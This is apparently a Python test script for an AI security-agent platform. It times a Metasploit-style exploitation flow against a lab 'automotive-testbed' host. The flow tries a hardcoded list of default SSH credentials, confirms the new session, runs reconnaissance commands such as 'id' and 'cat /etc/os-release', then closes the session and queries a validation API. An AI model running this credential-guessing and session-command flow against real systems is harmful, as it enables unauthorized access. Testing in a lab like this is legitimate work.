#!/usr/bin/env python3
"""
SSH Exploitation Test (Debug Timing)
====================================
Same strict exploitation flow as test_ssh_exploitation.py, with extra timing
instrumentation to identify bottlenecks.

Run inside the agents container:
    docker exec vt-saiber-agents python tests/mcp_tests/test_ssh_exploitation_debug.py

Optional env vars:
    KEEP_SESSION=true               # leave session open after test
    SLOW_THRESHOLD_SECONDS=5        # mark events above this as slow
    PERF_TOP_N=20                   # number of slowest events in summary
"""

import asyncio
import json
import os
import socket
import sys
import time
import traceback
from urllib import error, request

sys.path.insert(0, "/app")

from src.mcp.mcp_tool_bridge import get_mcp_bridge

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------

TARGET = os.getenv("TARGET_HOST", "automotive-testbed").strip() or "automotive-testbed"
SSH_PORT = "22"
KEEP_SESSION = os.getenv("KEEP_SESSION", "false").lower() == "true"
SLOW_THRESHOLD_SECONDS = float(os.getenv("SLOW_THRESHOLD_SECONDS", "5"))
PERF_TOP_N = int(os.getenv("PERF_TOP_N", "20"))

VALIDATION_ENDPOINTS = [
    f"http://{TARGET}:9999/validate/ssh_access",
    "http://automotive-testbed:9999/validate/ssh_access",
    "http://localhost:9999/validate/ssh_access",
]

SSH_CREDENTIALS = [
    ("admin", "password123"),
    ("admin", "admin"),
    ("root", "root"),
    ("ubuntu", "ubuntu"),
    ("user", "password"),
    ("admin", "password"),
]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

class Results:
    def __init__(self):
        self.passed = 0
        self.failed = 0
        self.errors = []

    def add_pass(self, name):
        self.passed += 1
        print(f"  [PASS] {name}")

    def add_fail(self, name, err):
        self.failed += 1
        self.errors.append((name, err))
        print(f"  [FAIL] {name}: {err}")

    def summary(self):
        total = self.passed + self.failed
        print(f"\n{'=' * 65}")
        print(f"SSH Exploitation Debug Tests: {self.passed}/{total} passed")
        if self.errors:
            print("Failed:")
            for name, err in self.errors:
                print(f"  - {name}: {err}")
        print(f"{'=' * 65}")
        return self.failed == 0


class PerfTracker:
    def __init__(self, slow_threshold_seconds: float):
        self.slow_threshold = slow_threshold_seconds
        self.events = []

    def add(self, label: str, elapsed: float):
        self.events.append((label, elapsed))
        ms = elapsed * 1000.0
        slow_flag = "  [SLOW]" if elapsed >= self.slow_threshold else ""
        print(f"    [TIMER] {label:<50} {ms:>9.1f} ms{slow_flag}")

    def summary(self, top_n: int):
        if not self.events:
            print("\nNo timing events recorded.")
            return

        total = sum(elapsed for _, elapsed in self.events)
        print(f"\n{'=' * 65}")
        print("Timing Summary")
        print(f"  Events: {len(self.events)}")
        print(f"  Total timed duration: {total:.2f}s")

        ranked = sorted(self.events, key=lambda x: x[1], reverse=True)
        print(f"\nTop {min(top_n, len(ranked))} slowest events:")
        for idx, (label, elapsed) in enumerate(ranked[:top_n], start=1):
            print(f"  {idx:>2}. {elapsed:>8.3f}s  {label}")

        by_prefix = {}
        for label, elapsed in self.events:
            prefix = label.split(":", 1)[0]
            by_prefix[prefix] = by_prefix.get(prefix, 0.0) + elapsed

        print("\nAggregate by phase:")
        for prefix, elapsed in sorted(by_prefix.items(), key=lambda x: x[1], reverse=True):
            print(f"  - {prefix:<18} {elapsed:>8.3f}s")
        print(f"{'=' * 65}")


results = Results()
perf = PerfTracker(SLOW_THRESHOLD_SECONDS)


def _timed_sync(label, fn):
    start = time.perf_counter()
    value = fn()
    perf.add(label, time.perf_counter() - start)
    return value


async def _timed_async(label, coro):
    start = time.perf_counter()
    value = await coro
    perf.add(label, time.perf_counter() - start)
    return value


def _get_tool(bridge, base_name):
    for tool in bridge.all_tools:
        name = tool.name.split("_", 1)[1] if "_" in tool.name else tool.name
        if name == base_name:
            return tool
    return None


def _parse(raw):
    if isinstance(raw, str):
        try:
            return json.loads(raw)
        except Exception:
            return {"raw": raw}
    return raw or {}


def _session_dict(raw_sessions: dict) -> dict[str, dict]:
    return {str(k): v for k, v in (raw_sessions or {}).items()}


def _session_tied_to_target(info: dict, target: str, target_ip: str | None) -> bool:
    if not isinstance(info, dict):
        return False

    blob = json.dumps(info, default=str).lower()
    indicators = [target.lower(), f":{SSH_PORT}"]
    if target_ip:
        indicators.append(target_ip)
        indicators.append(f"{target_ip}:{SSH_PORT}")
    return any(ind in blob for ind in indicators)


def _find_new_target_session(
    baseline_sessions: dict[str, dict],
    current_sessions: dict[str, dict],
    target: str,
    target_ip: str | None,
) -> int | None:
    baseline_ids = set(baseline_sessions.keys())
    new_ids = [sid for sid in current_sessions.keys() if sid not in baseline_ids]

    for sid in sorted(new_ids, key=lambda s: int(s) if str(s).isdigit() else s):
        info = current_sessions.get(sid, {})
        if _session_tied_to_target(info, target, target_ip):
            try:
                return int(sid)
            except ValueError:
                continue
    return None


async def _list_active_sessions(bridge, label_prefix="list_active_sessions"):
    sessions_tool = _timed_sync("tool_lookup:list_active_sessions", lambda: _get_tool(bridge, "list_active_sessions"))
    if not sessions_tool:
        return "error", {}, 0

    raw = await _timed_async(f"{label_prefix}:tool_call", sessions_tool.coroutine())
    result = _timed_sync(f"{label_prefix}:parse", lambda: _parse(raw))

    status = result.get("status", "unknown")
    sessions = _session_dict(result.get("sessions", {}))
    count = int(result.get("count", len(sessions)))
    return status, sessions, count


def _resolve_target_ip(target: str) -> str | None:
    try:
        return _timed_sync("resolve_target_ip", lambda: socket.gethostbyname(target))
    except Exception:
        return None


async def run_ssh_login_scan(
    bridge,
    baseline_sessions: dict[str, dict],
    target_ip: str | None,
) -> tuple[int | None, dict]:
    aux_tool = _timed_sync("tool_lookup:run_auxiliary_module", lambda: _get_tool(bridge, "run_auxiliary_module"))
    if not aux_tool:
        results.add_fail("ssh_login_scan", "run_auxiliary_module not found on bridge")
        return None, {}

    print(f"\n{'=' * 65}")
    print(f"  Step 1 — SSH Login Scan ({TARGET}:{SSH_PORT})")
    print(f"{'=' * 65}")

    last_result: dict = {}

    for idx, (username, password) in enumerate(SSH_CREDENTIALS, start=1):
        print(f"\n  Attempt {idx}/{len(SSH_CREDENTIALS)} => {username}:{password}")
        attempt_start = time.perf_counter()

        try:
            raw = await _timed_async(
                f"ssh_login_attempt:{username}:{password}:tool_call",
                aux_tool.coroutine(
                    module_name="scanner/ssh/ssh_login",
                    options={
                        "RHOSTS": TARGET,
                        "RPORT": SSH_PORT,
                        "USERNAME": username,
                        "PASSWORD": password,
                        "STOP_ON_SUCCESS": "true",
                        "VERBOSE": "true",
                    },
                ),
            )
        except Exception as e:
            print(f"  Exception calling run_auxiliary_module: {e}")
            traceback.print_exc()
            perf.add(f"ssh_login_attempt:{username}:{password}:total", time.perf_counter() - attempt_start)
            continue

        result = _timed_sync(
            f"ssh_login_attempt:{username}:{password}:parse",
            lambda: _parse(raw),
        )
        last_result = result

        status = result.get("status", "unknown")
        message = result.get("message", "")
        output = result.get("module_output", "")

        print(f"  Status  : {status}")
        if message:
            print(f"  Message : {message[:300]}")
        if output:
            print(f"  Output  :\n{output[:1500]}")

        await _timed_async("post_attempt_sleep", asyncio.sleep(1))
        s_status, sessions_now, s_count = await _list_active_sessions(
            bridge,
            label_prefix=f"post_attempt_list_sessions:{username}:{password}",
        )

        print(f"  Session check after attempt: status={s_status}, count={s_count}")
        new_sid = _timed_sync(
            f"new_session_detection:{username}:{password}",
            lambda: _find_new_target_session(baseline_sessions, sessions_now, TARGET, target_ip),
        )

        attempt_total = time.perf_counter() - attempt_start
        perf.add(f"ssh_login_attempt:{username}:{password}:total", attempt_total)
        print(f"  Attempt elapsed: {attempt_total:.2f}s")

        if new_sid is not None:
            print(f"\n  Valid credentials confirmed by NEW target session: {username}:{password}")
            results.add_pass(f"ssh_login_scan ({username}:{password})")
            return new_sid, result

    results.add_fail(
        "ssh_login_scan",
        (
            "No new target-linked session created. "
            "Module execution alone does not prove SSH exploitation."
        ),
    )
    return None, last_result


async def check_sessions(bridge, expected_session_id: int, target_ip: str | None) -> int | None:
    sessions_tool = _timed_sync("tool_lookup:check_sessions", lambda: _get_tool(bridge, "list_active_sessions"))
    if not sessions_tool:
        results.add_fail("check_sessions", "list_active_sessions not found on bridge")
        return None

    print(f"\n{'=' * 65}")
    print("  Step 2 — Check Active Sessions")
    print(f"{'=' * 65}")

    try:
        raw = await _timed_async("check_sessions:tool_call", sessions_tool.coroutine())
    except Exception as e:
        results.add_fail("check_sessions", str(e))
        return None

    result = _timed_sync("check_sessions:parse", lambda: _parse(raw))
    status = result.get("status", "unknown")
    sessions = _session_dict(result.get("sessions", {}))
    count = int(result.get("count", len(sessions)))

    print(f"  Status  : {status}")
    print(f"  Sessions: {count}")

    if status != "success":
        results.add_fail("check_sessions", f"list_active_sessions status={status}")
        return None

    if not sessions:
        results.add_fail("check_sessions", "No active sessions found")
        return None

    for sid, info in sessions.items():
        stype = info.get("type", "?") if isinstance(info, dict) else "?"
        target = info.get("target_host", info.get("via_exploit", "?")) if isinstance(info, dict) else "?"
        print(f"  Session {sid}: type={stype}  target={target}")

    expected_sid_str = str(expected_session_id)
    if expected_sid_str not in sessions:
        results.add_fail(
            "check_sessions",
            f"Expected new session {expected_session_id} not present in active sessions",
        )
        return None

    expected_info = sessions[expected_sid_str]
    if not _session_tied_to_target(expected_info, TARGET, target_ip):
        results.add_fail(
            "check_sessions",
            f"Session {expected_session_id} exists but is not tied to target {TARGET}",
        )
        return None

    print(f"\n  Using verified session {expected_session_id} for command execution")
    results.add_pass(f"check_sessions (verified session {expected_session_id})")
    return expected_session_id


async def send_commands(bridge, session_id: int):
    if session_id is None:
        print(f"\n{'=' * 65}")
        print("  Step 3 — Skipping send_session_command (no session)")
        print(f"{'=' * 65}")
        return

    cmd_tool = _timed_sync("tool_lookup:send_session_command", lambda: _get_tool(bridge, "send_session_command"))
    if not cmd_tool:
        results.add_fail("send_commands", "send_session_command not found on bridge")
        return

    print(f"\n{'=' * 65}")
    print(f"  Step 3 — Interactive Commands (session {session_id})")
    print(f"{'=' * 65}")

    commands = ["id", "uname -a", "hostname", "cat /etc/os-release"]

    for cmd in commands:
        print(f"\n  $ {cmd}")
        try:
            raw = await _timed_async(
                f"session_cmd:{cmd}:tool_call",
                cmd_tool.coroutine(session_id=session_id, command=cmd, timeout_seconds=15),
            )
        except Exception as e:
            print(f"  Exception: {e}")
            results.add_fail(f"send_commands ({cmd})", str(e))
            continue

        result = _timed_sync(f"session_cmd:{cmd}:parse", lambda: _parse(raw))
        status = result.get("status", "unknown")
        output = result.get("output", result.get("raw", ""))

        print(f"  Status : {status}")
        print(f"  Output : {output[:500]}")

        if status == "success" and output.strip():
            results.add_pass(f"send_commands ({cmd})")
        else:
            results.add_fail(f"send_commands ({cmd})", f"status={status}, output={output[:100]}")


async def terminate_session(bridge, session_id: int):
    if session_id is None:
        print(f"\n{'=' * 65}")
        print("  Step 4 — Skipping terminate_session (no session)")
        print(f"{'=' * 65}")
        return

    if KEEP_SESSION:
        print(f"\n  KEEP_SESSION=true — leaving session {session_id} open")
        return

    term_tool = _timed_sync("tool_lookup:terminate_session", lambda: _get_tool(bridge, "terminate_session"))
    if not term_tool:
        results.add_fail("terminate_session", "terminate_session not found on bridge")
        return

    print(f"\n{'=' * 65}")
    print(f"  Step 4 — Terminate Session {session_id}")
    print(f"{'=' * 65}")

    try:
        raw = await _timed_async("terminate_session:tool_call", term_tool.coroutine(session_id=session_id))
    except Exception as e:
        results.add_fail("terminate_session", str(e))
        return

    result = _timed_sync("terminate_session:parse", lambda: _parse(raw))
    status = result.get("status", "unknown")
    message = result.get("message", "")

    print(f"  Status  : {status}")
    print(f"  Message : {message}")

    if status in ("success", "warning"):
        results.add_pass("terminate_session")
    else:
        results.add_fail("terminate_session", f"status={status}: {message}")


async def validate_v1_ssh_access():
    print(f"\n{'=' * 65}")
    print("  Step 5 — Validate V1 via Validation API")
    print(f"{'=' * 65}")

    for url in VALIDATION_ENDPOINTS:
        try:
            print(f"  GET {url}")

            start = time.perf_counter()
            with request.urlopen(url, timeout=8) as resp:
                body = resp.read().decode("utf-8")
            perf.add(f"validation_api:{url}", time.perf_counter() - start)

            payload = _timed_sync(f"validation_parse:{url}", lambda: json.loads(body))
            success = bool(payload.get("success", False))
            print(f"  Response success: {success}")
            if success:
                results.add_pass("validate_v1_ssh_access")
                return True
        except (error.URLError, TimeoutError, ValueError, json.JSONDecodeError) as e:
            print(f"  Validation endpoint error: {e}")
            continue

    results.add_fail(
        "validate_v1_ssh_access",
        "Validation API did not confirm /validate/ssh_access success",
    )
    return False


async def run_all():
    overall_start = time.perf_counter()

    print("\n" + "=" * 65)
    print("  SSH Exploitation Debug Test — automotive-testbed")
    print("=" * 65)
    print(f"  Target : {TARGET}:{SSH_PORT}")
    print(f"  Creds  : {[f'{u}:{p}' for u, p in SSH_CREDENTIALS]}")
    print(f"  Slow threshold: {SLOW_THRESHOLD_SECONDS:.2f}s")
    if KEEP_SESSION:
        print("  Mode   : KEEP_SESSION=true (session will not be terminated)")

    target_ip = _resolve_target_ip(TARGET)
    print(f"  Target IP (resolved): {target_ip or 'unresolved'}")

    bridge = await _timed_async("bridge:get_mcp_bridge", get_mcp_bridge())
    try:
        print(f"\n{'=' * 65}")
        print("  Baseline — Active Sessions Before Scan")
        print(f"{'=' * 65}")

        base_status, baseline_sessions, base_count = await _list_active_sessions(
            bridge,
            label_prefix="baseline_list_sessions",
        )
        print(f"  Status  : {base_status}")
        print(f"  Sessions: {base_count}")

        if base_status != "success":
            results.add_fail("baseline_sessions", f"Could not list sessions: status={base_status}")
            return results.summary()
        results.add_pass(f"baseline_sessions ({base_count} session(s) pre-existing)")

        session_id, _ = await run_ssh_login_scan(bridge, baseline_sessions, target_ip)
        if session_id is None:
            return results.summary()

        await _timed_async("post_scan_sleep", asyncio.sleep(2))

        verified_session_id = await check_sessions(bridge, session_id, target_ip)
        if verified_session_id is None:
            return results.summary()

        await send_commands(bridge, verified_session_id)
        await terminate_session(bridge, verified_session_id)
        await validate_v1_ssh_access()

        return results.summary()
    finally:
        await _timed_async("bridge:disconnect", bridge.disconnect())
        perf.add("overall_runtime", time.perf_counter() - overall_start)
        perf.summary(PERF_TOP_N)


if __name__ == "__main__":
    try:
        success = asyncio.run(run_all())
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print("\n\nInterrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n\nFATAL: {e}")
        traceback.print_exc()
        sys.exit(1)
